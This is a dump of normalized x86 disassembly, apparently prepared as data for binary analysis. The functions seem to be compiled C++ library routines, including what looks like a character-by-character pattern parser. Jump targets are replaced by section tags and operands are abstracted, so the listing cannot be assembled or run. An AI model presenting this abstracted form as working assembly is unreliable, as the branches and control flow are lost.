mov ebp esp
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
call sub_410ca9
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
pop ebp
retn 0x8
sub_411e71
push ebp
mov ebp esp
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
test al al
jne r-xdata
xor eax eax
inc eax
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x4 ]
test al al
jne r-xdata
xor eax eax
jmp r-xdata
pop ebp
retn 0x4
sub_411e9e
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
call sub_410ca9
call sub_407e47
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
pop ebp
retn 0x8
sub_411eff
push ebp
mov ebp esp
sub esp 0x10
cmp eax 0x3fffffff
ja r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_4252f8
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_426f77
shl eax 0x2
push eax
call sub_424ff8
pop ecx
test eax eax
jne r-xdata
leave
retn
sub_411f41
push ebp
mov ebp esp
sub esp 0x10
cmp eax 0x3fffffff
ja r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_4252f8
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_426f77
shl eax 0x2
push eax
call sub_424ff8
pop ecx
test eax eax
jne r-xdata
leave
retn
sub_411fdc
push esi
mov esi eax
cmp esi 0x100
jb r-xdata
xor eax eax
mov ecx esi
and ecx 0x3f
inc eax
xor edx edx
call sub_449ca0
shr esi 0x6
and eax [ edi + esi * 8 ]
and edx [ edi + esi * 8 + 0x4 ]
pop esi
or eax edx
je r-xdata
push r--data
call sub_446ae2
xor eax eax
retn
xor eax eax
inc eax
retn
sub_41202b
push ebp
mov ebp esp
movzx ecx [ eax + 0x218 ]
xor edx edx
cmp dx cx
je r-xdata
xor eax eax
movzx edx [ ebp + 0x8 ]
mov ax [ eax + edx * 2 + 0x8 ]
and ax cx
xor ecx ecx
cmp cx ax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_41205a
push 0x0
mov eax sub_44e1fb
call sub_448595
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_404720
and [ ebp - 0x4 ] 0x0
lea ebx [ esi + 0x1c ]
and [ ebx ] 0x0
mov [ ebp + 0xc ] ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
call sub_407bf1
mov eax esi
call sub_44866d
retn 0xc
sub_4121d8
lea eax [ esi + 0x8 ]
call sub_4123b4
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x10 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_412205
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
lea esi [ edi + 0x10 ]
call sub_407804
push eax
push [ ebp + 0x8 ]
add edi 0x8
push edi
call sub_413f27
pop edi
pop esi
pop ebp
retn 0x4
sub_412227
push ebp
mov ebp esp
push esi
push edi
test ecx ecx
je r-xdata
xor esi esi
lea esi [ ecx + 0x8 ]
jmp r-xdata
lea edi [ ecx + 0x10 ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_413f48
mov esi edi
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_4122a4
lea eax [ esi + 0x8 ]
call sub_4123ef
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x10 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4122d1
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x10 ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
lea eax [ ebx + 0x8 ]
push [ ebp + 0x8 ]
call sub_415ac5
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4122ff
push ebp
mov ebp esp
push esi
push edi
test ecx ecx
je r-xdata
xor esi esi
lea esi [ ecx + 0x8 ]
jmp r-xdata
lea edi [ ecx + 0x10 ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_413f99
mov esi edi
call sub_407e47
mov edx [ eax ]
pop edi
pop esi
mov ecx eax
pop ebp
jmp [ edx + 0x8 ]
sub_412394
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_41240a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4123b4
mov ecx [ edx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
retn
push esi
xor esi esi
add ecx 0x4
inc esi
[ ecx ] esi
pop esi
sub_4123cf
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_412450
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4123ef
mov ecx [ edx ]
mov [ eax ] ecx
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
retn
push esi
xor esi esi
add ecx 0x4
inc esi
[ ecx ] esi
pop esi
sub_41240a
push 0x0
mov eax sub_44b178
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov edi [ edi + 0x8 ]
test edi edi
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c2c3
call sub_44866d
retn 0x4
lea esi [ edi + 0x4 ]
call sub_40c2c3
sub_412450
push 0x0
mov eax sub_44b14a
call sub_448595
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov edi [ edi + 0x8 ]
test edi edi
je r-xdata
lea esi [ eax + 0x4 ]
call sub_40c2c3
call sub_44866d
retn 0x4
lea esi [ edi + 0x4 ]
call sub_40c2c3
sub_4124b2
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_4124e2
push ebp
mov ebp esp
cmp [ ecx + 0x4 ] 0x3ffffffe
je r-xdata
push [ ebp + 0x8 ]
call sub_40b481
pop ecx
cmp [ ecx ] 0x0
je r-xdata
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40b43d
pop ecx
pop esi
jmp r-xdata
pop ebp
retn 0xc
sub_412510
push 0x74
mov eax sub_44e0f1
call sub_4485fe
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
and [ ebp - 0x38 ] 0x0
mov ebx edx
mov edi ecx
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x40 ] ebx
cmp [ ebx ] esi
jne r-xdata
lea eax [ edi + 0x8 ]
push esi
push eax
mov edi ebx
mov [ ebp - 0x3c ] eax
call sub_40d1fb
cmp [ eax ] esi
je r-xdata
push 0x283
push r--data
push r--data
call sub_4258e2
add esp 0xc
push 0x284
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov eax [ ebx ]
movsx ecx [ eax ]
cmp ecx 0x3f
jg r-xdata
mov edi [ ebp - 0x34 ]
and [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0xf
lea esi [ ebp - 0x2c ]
mov [ edi ] 0x0
call sub_404744
mov eax [ ebp - 0x44 ]
add eax 0x4
mov [ ebp - 0x48 ] eax
sub ecx 0x5b
je r-xdata
je r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx 0x1
je r-xdata
push esi
push [ ebp - 0x3c ]
lea edi [ ebp - 0x30 ]
call sub_40d1fb
cmp [ eax ] esi
jne r-xdata
inc eax
mov [ ebx ] eax
push 0x7
dec ecx
je r-xdata
cmp ecx 0x24
je r-xdata
mov edi [ ebp - 0x34 ]
and [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0xf
lea esi [ ebp - 0x2c ]
mov [ edi ] 0x0
call sub_404744
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebx ] edi
jae r-xdata
mov eax [ ebp - 0x30 ]
movsx eax [ eax ]
cmp eax 0x3f
jg r-xdata
push 0x2f
jmp r-xdata
mov eax [ ebx ]
mov al [ eax ]
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x30 ] al
push [ ebp - 0x30 ]
xor edi edi
inc edi
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
call sub_4098a0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
mov edi [ ebx ]
lea eax [ edi + 0x1 ]
mov [ ebx ] eax
mov [ ebp - 0x30 ] eax
cmp eax esi
je r-xdata
inc eax
mov [ ebx ] eax
cmp eax esi
je r-xdata
dec ecx
dec ecx
je r-xdata
inc eax
mov [ ebx ] eax
jmp r-xdata
cmp ecx 0x28
je r-xdata
push 0x0
mov [ ebp - 0x4 ] 0x0
lea eax [ eax + ecx - 0x1 ]
push eax
lea ebx [ ebp - 0x4c ]
lea eax [ ebp - 0x2c ]
call sub_414063
lea eax [ ebp - 0x2c ]
sub eax 0x5b
je r-xdata
je r-xdata
pop eax
push 0x2
jmp r-xdata
mov edx ebx
call sub_40d26c
jmp r-xdata
sub ecx 0x1e
jmp r-xdata
cmp ecx 0x29
je r-xdata
push 0x7
dec eax
je r-xdata
push 0x6
jmp r-xdata
cmp eax 0x24
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x30 ]
mov cl [ eax ]
mov eax [ ebp - 0x2c ]
jae r-xdata
dec eax
dec eax
jne r-xdata
pop eax
test eax eax
je r-xdata
jne r-xdata
jle r-xdata
inc [ ebp - 0x30 ]
cmp [ ebp - 0x30 ] esi
je r-xdata
dec eax
dec eax
je r-xdata
push 0x23
jmp r-xdata
cmp eax 0x28
je r-xdata
add eax [ ebp - 0x1c ]
inc [ ebp - 0x30 ]
push ecx
lea ebx [ ebp - 0x4c ]
lea eax [ ebp - 0x2c ]
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
push [ ebp - 0x44 ]
mov eax esi
call sub_412adc
mov esi eax
lea edi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
movsd [ edi ] [ esi ]
cmp [ ebp - 0x64 ] ebx
jne r-xdata
cmp ecx 0x2b
jle r-xdata
push 0x2
jmp r-xdata
lea edx [ ebp - 0x30 ]
call sub_40d26c
jmp r-xdata
push 0x22
jmp r-xdata
sub eax 0x1e
je r-xdata
inc [ ebp - 0x30 ]
push 0x3
jmp r-xdata
cmp eax 0x29
je r-xdata
mov ebx eax
mov esi ecx
jmp r-xdata
mov edi [ ebp - 0x34 ]
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] ebx
lea esi [ ebp - 0x2c ]
mov [ edi ] bl
call sub_404744
mov [ ebp - 0x4 ] bl
push ebx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp ecx 0x2e
sub eax 0x0
je r-xdata
push 0x5
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x4
jmp r-xdata
jle r-xdata
mov eax [ ebp - 0x48 ]
and [ ebp - 0x5c ] 0x0
and [ ebp - 0x58 ] 0x0
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x5c ]
push eax
push esi
push [ ebp - 0x3c ]
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x54 ] 0x0
call sub_411262
test al al
jne r-xdata
xor eax eax
inc eax
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x38 ] eax
call sub_40487c
mov eax edi
call sub_448681
retn 0x8
add eax [ ebp - 0x1c ]
push [ ebp - 0x70 ]
lea ebx [ ebp - 0x60 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp eax 0x2b
jle r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_4047c2
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x30 ]
mov edi [ eax ]
mov [ eax ] ecx
mov ecx [ ebp + 0xc ]
cmp [ eax ] ecx
je r-xdata
cmp eax 0x2e
jne r-xdata
inc [ ebp - 0x30 ]
xor eax eax
inc eax
jmp r-xdata
sub_4127ed
push 0x34
mov eax sub_44c3da
call sub_4485fe
mov eax [ ebp + 0xc ]
and [ ebp - 0x38 ] 0x0
mov edi ecx
cmp [ edi + 0x10 ] 0x0
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] eax
jne r-xdata
xor esi esi
inc esi
cmp [ edi + 0x10 ] esi
jne r-xdata
push 0x77
push r--data
push r--data
call sub_4258e2
add esp 0xc
test [ ebp + 0x8 ] 0x2
lea eax [ ebp - 0x34 ]
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
push edi
call sub_4141e5
lea eax [ ebp - 0x34 ]
push eax
push ebx
mov [ ebp - 0x4 ] 0x2
call sub_41483b
push [ ebp - 0x3c ]
push edi
push eax
call sub_414175
lea eax [ ebp - 0x34 ]
push eax
push ebx
mov [ ebp - 0x4 ] esi
call sub_4147ca
jmp r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x3c ]
mov al [ edi ]
mov esi ebx
call sub_412bc4
pop ecx
jmp r-xdata
mov edi [ edi ]
pop ecx
pop ecx
push 0x0
push esi
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x4 ] 0x0
call sub_40487c
mov eax ebx
call sub_448681
retn
sub_41289c
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
push esi
mov esi ecx
mov ecx [ eax + 0x204 ]
mov eax [ ecx ]
push edi
push 0xa
call [ eax + 0x18 ]
mov cl al
xor eax eax
lea edi [ ebp - 0x8 ]
stosw [ edi ]
mov [ ebp - 0x5 ] al
mov eax 0x1800
and esi eax
mov [ ebp - 0x8 ] cl
mov [ ebp - 0x7 ] 0x100
cmp esi 0x800
je r-xdata
mov [ ebp - 0x1 ] 0x0
cmp esi 0x1000
je r-xdata
mov [ ebp - 0x1 ] cl
jmp r-xdata
cmp esi eax
je r-xdata
lea eax [ ebp - 0x1 ]
push eax
push [ ebp + 0x8 ]
call sub_4148ac
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_414916
jmp r-xdata
push [ ebp + 0x8 ]
call sub_414980
jmp r-xdata
pop ecx
mov eax [ ebp + 0x8 ]
pop ecx
pop edi
pop esi
leave
retn
sub_41291c
push 0x8
mov eax sub_44c396
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0xc
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov esi eax
call sub_41424a
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_4149e7
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_412982
push 0x8
mov eax sub_44c35a
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0xc
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov esi eax
call sub_4142ee
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_414a57
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4129e8
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
test [ ebp + 0x8 ] 0x400
je r-xdata
mov eax [ ebp + 0xc ]
push esi
lea esi [ ebp + 0x8 ]
call sub_4146ef
mov eax esi
push eax
push edi
call sub_414ac7
pop ecx
pop ecx
pop esi
push edi
call sub_41291c
pop ecx
jmp r-xdata
mov eax edi
leave
retn
sub_412a1e
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
test [ ebp + 0x8 ] 0x400
je r-xdata
mov eax [ ebp + 0xc ]
push esi
lea esi [ ebp + 0x8 ]
call sub_4146ef
mov eax esi
push eax
push edi
call sub_414b30
pop ecx
pop ecx
pop esi
push edi
call sub_412982
pop ecx
jmp r-xdata
mov eax edi
leave
retn
sub_412a54
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea esi [ ebp - 0x2 ]
call sub_4143aa
push eax
push [ ebp + 0x8 ]
call sub_414b99
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop esi
leave
retn
sub_412a76
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea esi [ ebp - 0x2 ]
call sub_4143d0
push eax
push [ ebp + 0x8 ]
call sub_414c02
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop esi
leave
retn
sub_412a98
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea esi [ ebp - 0x2 ]
call sub_4143f6
push eax
push [ ebp + 0x8 ]
call sub_414c6b
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop esi
leave
retn
sub_412aba
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea esi [ ebp - 0x2 ]
call sub_41441c
push eax
push [ ebp + 0x8 ]
call sub_414cd4
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop esi
leave
retn
sub_412adc
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov ebx eax
cmp [ esi ] ebx
push 0x2c3
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0x2
push eax
call sub_403978
mov ecx [ esi ]
movzx ecx [ ecx ]
mov eax [ ebp + 0x8 ]
add esp 0x18
push ecx
add eax 0x8
push eax
push 0xa
pop edi
mov [ ebp - 0xc ] eax
call sub_406e7c
test eax eax
jle r-xdata
push [ ebp - 0xc ]
lea eax [ ebp - 0x1c ]
push ebx
push eax
mov eax esi
call sub_414d3d
add esp 0xc
mov esi eax
mov eax [ esi ]
push 0x3e7
push [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov eax edi
lea esi [ ebp - 0x8 ]
call sub_4139a9
pop ecx
pop ecx
cmp eax edi
jl r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ edx ] ecx
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x10 ] 0x1
lea esi [ ebp - 0x1c ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp eax [ ecx ]
jg r-xdata
mov eax [ ebp + 0xc ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
pop ebx
leave
retn 0xc
mov esi [ ebp + 0x10 ]
sub_412b99
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
test [ ebp + 0x8 ] 0x2
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
push esi
je r-xdata
call sub_415051
call sub_414fe8
jmp r-xdata
pop ecx
mov eax esi
pop ecx
leave
retn
sub_412bc4
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
test [ ebp + 0x8 ] 0x2
je r-xdata
mov [ ebp + 0xb ] al
lea eax [ ebp + 0xb ]
push eax
push esi
call sub_415124
mov ecx [ ecx + 0x204 ]
mov edx [ ecx ]
push eax
call [ edx + 0x8 ]
mov [ ebp + 0xb ] al
lea eax [ ebp + 0xb ]
push eax
push esi
call sub_4150ba
jmp r-xdata
pop ecx
mov eax esi
pop ecx
leave
retn
sub_412c03
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] cl
xor ecx ecx
mov [ ebp - 0x2 ] ax
cmp cx ax
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_41518e
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
leave
retn
push 0x28
push r--data
push r--data
call sub_4258e2
add esp 0xc
sub_412c40
push 0x188
mov eax sub_44e624
call sub_4485fe
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x5d ] 0x0
mov [ ebp - 0x5f ] 0x0
mov [ ebp - 0x5e ] 0x0
mov [ ebp - 0x80 ] 0x0
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] 0x0
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x9c ] bl
mov [ ebp - 0x98 ] esi
mov [ ebp - 0x94 ] esi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0x8c ] esi
mov [ ebp - 0x88 ] esi
mov [ ebp - 0x84 ] esi
mov [ ebp - 0xc4 ] bl
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xbc ] esi
mov [ ebp - 0xb8 ] esi
mov [ ebp - 0xb4 ] esi
mov [ ebp - 0xb0 ] esi
mov [ ebp - 0xac ] esi
mov [ ebp - 0x4 ] 0x5
mov edx [ ecx + 0x210 ]
mov [ ebp - 0xa4 ] edx
add ecx 0x8
lea edx [ ebp - 0x2c ]
push edx
mov [ ebp - 0x7c ] ecx
push ecx
mov ecx eax
mov edx edi
mov [ ebp - 0x50 ] esi
call sub_40ab3c
add eax 0xffffffec
cmp eax 0xb
ja r-xdata
mov eax [ ebp - 0x5c ]
inc [ eax ]
mov edi [ eax ]
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x114 ]
push eax
mov [ ebp - 0x68 ] edi
call sub_40d8bf
pop ecx
pop ecx
mov ebx eax
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0xe
call sub_406dc4
lea eax [ ebp - 0x114 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_4069e4
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0xe0 ]
push eax
mov [ ebp - 0x68 ] edi
call sub_40d96c
pop ecx
pop ecx
mov ebx eax
lea esi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0xf
call sub_406dc4
lea eax [ ebp - 0xe0 ]
jmp [ eax * 4 + jump_table_413800 ]
xor al al
push esi
push [ ebp - 0x7c ]
call sub_40d1fb
cmp [ eax ] esi
je r-xdata
push [ ebp - 0x54 ]
mov eax [ edi ]
push [ ebp - 0x7c ]
lea edi [ ebp - 0x50 ]
mov [ ebp - 0x50 ] eax
call sub_40d1fb
mov ecx [ ebp - 0x54 ]
cmp [ eax ] ecx
je r-xdata
mov [ ebp - 0x80 ] 0x1
mov [ ebp - 0x5f ] 0x1
jmp r-xdata
mov [ ebp - 0x80 ] 0x1
mov [ ebp - 0x5e ] 0x1
jmp r-xdata
mov [ ebp - 0x5d ] 0x1
jmp r-xdata
mov eax [ ebp - 0x54 ]
cmp [ edi ] eax
mov ebx 0x155
jmp r-xdata
mov eax [ ebp - 0x54 ]
cmp [ edi ] eax
je r-xdata
push 0x10
mov eax r--data
lea esi [ ebp - 0x170 ]
call sub_4038f9
mov [ ebp - 0x4 ] 0x7
push 0x16d
mov eax [ ebp - 0x54 ]
cmp [ edi ] eax
je r-xdata
mov eax [ ebp - 0x5c ]
inc [ eax ]
mov edi [ eax ]
and [ ebp - 0x78 ] 0x0
lea esi [ eax + 0x21c ]
mov [ ebp - 0x68 ] esi
call sub_406b2e
push 0x38
pop ebx
mov ecx [ eax + ebx + 0x4 ]
sub ecx [ eax + ebx ]
sar ecx 0x5
test ecx ecx
je r-xdata
mov eax [ ebp - 0x54 ]
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x5e ] 0x0
je r-xdata
push [ ebp - 0x9c ]
lea esi [ ebp - 0xe0 ]
call sub_415275
pop ecx
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x11
call sub_406cd3
mov eax esi
push eax
mov [ ebp - 0x4 ] 0x5
call sub_4069e4
push [ ebp - 0x9c ]
lea ecx [ ebp - 0x90 ]
push [ ebp - 0x80 ]
lea eax [ ebp - 0x6c ]
call sub_4144bb
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp - 0xe0 ]
push eax
mov [ ebp - 0x4 ] 0x12
call sub_415295
pop ecx
pop ecx
mov ebx eax
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x13
call sub_406dc4
lea eax [ ebp - 0xe0 ]
push eax
mov [ ebp - 0x4 ] 0x12
call sub_4069e4
mov [ ebp - 0x4 ] 0x5
mov eax [ ebp - 0x6c ]
mov edx edi
mov eax [ edx ]
movsx ecx [ eax ]
cmp ecx 0x3f
jg r-xdata
mov edi [ ebp - 0x64 ]
mov esi [ ebp - 0x54 ]
push edi
push [ ebp - 0x5c ]
mov ecx esi
lea edx [ ebp - 0xe0 ]
call sub_40adf5
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x10
call sub_406cd3
lea eax [ ebp - 0xe0 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_4069e4
lea eax [ ebp - 0xc4 ]
lea ecx [ ebp - 0x9c ]
call sub_406cd3
cmp [ edi ] esi
je r-xdata
mov eax [ ebp - 0x50 ]
movsx eax [ eax ]
cmp eax 0x3f
jg r-xdata
push ebx
push r--data
push r--data
setne al
push r--data
movzx eax al
push 0x5
push eax
call sub_403978
add esp 0x18
test al al
jne r-xdata
xor al al
push eax
push [ ebp - 0x7c ]
call sub_40d1fb
mov esi [ ebp - 0x54 ]
cmp [ eax ] esi
je r-xdata
xor al al
push eax
push [ ebp - 0x7c ]
call sub_40d1fb
mov esi [ ebp - 0x54 ]
cmp [ eax ] esi
je r-xdata
mov eax [ ebp - 0x5c ]
push [ eax ]
lea eax [ ebp - 0x2c ]
sub esp 0x1c
mov esi esp
mov [ ebp - 0x78 ] esp
push eax
call sub_404720
lea ecx [ ebp - 0x4c ]
call sub_4140c6
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x4 ] 0xa
mov esi [ ebp - 0x68 ]
call sub_406b2e
lea ecx [ ebx + eax ]
mov eax [ ebp - 0x78 ]
call sub_40ee56
push 0x0
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x5
call sub_40487c
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x130 ]
push eax
mov [ ebp - 0x68 ] edi
call sub_40d8bf
pop ecx
pop ecx
mov ebx eax
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0xb
call sub_406dc4
lea eax [ ebp - 0x130 ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_4069e4
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x14c ]
push eax
mov [ ebp - 0x68 ] edi
call sub_40d96c
pop ecx
pop ecx
mov ebx eax
lea esi [ ebp - 0xc4 ]
mov [ ebp - 0x4 ] 0xc
call sub_406dc4
lea eax [ ebp - 0x14c ]
jmp r-xdata
and [ ebp - 0xa0 ] 0x0
xor al al
push eax
push [ ebp - 0x7c ]
call sub_40d1fb
mov esi [ ebp - 0x54 ]
cmp [ eax ] esi
je r-xdata
cmp [ ebp - 0x5d ] 0x0
je r-xdata
push [ ebp - 0x9c ]
lea esi [ ebp - 0xe0 ]
call sub_415275
pop ecx
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x14
call sub_406cd3
mov eax esi
push eax
mov [ ebp - 0x4 ] 0x5
call sub_4069e4
push [ ebp - 0x9c ]
mov ecx [ ebp - 0x98 ]
push [ ebp - 0x80 ]
lea eax [ ebp - 0x90 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call sub_4144e0
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0xe0 ]
push eax
